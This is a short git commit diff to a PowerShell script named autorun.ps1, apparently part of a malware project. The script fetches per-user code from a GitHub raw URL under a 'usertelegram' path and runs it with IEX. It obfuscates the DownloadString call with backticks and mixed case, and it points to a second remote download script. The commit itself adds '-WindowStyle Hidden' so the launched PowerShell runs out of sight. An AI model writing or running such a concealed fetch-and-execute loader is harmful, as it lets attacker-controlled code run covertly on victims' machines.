50c9e4be6388179a52e9da335b5f6b29fef125af
43a1723 <hai1723notgay@gmail.com>
2024-07-01 16:59:18 +0700

    Update autorun.ps1

--- Extras/autorun.ps1
+++ Extras/autorun.ps1
@@ -1,6 +1,6 @@
 $codeuser = ("https://raw.githubusercontent.com/43a1723/test/main/usertelegram/$userid/main.ps1")
 $downloaduser = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$codeuser')"
-Start-Process "powershell" -Argument "`$userid=$userid;IEX($downloaduser)"
+Start-Process "powershell" -Argument "`$userid=$userid;IEX($downloaduser)" -WindowStyle Hidden
 
 $powershell_url = "https://raw.githubusercontent.com/43a1723/test/main/Extras/download.ps1"
 
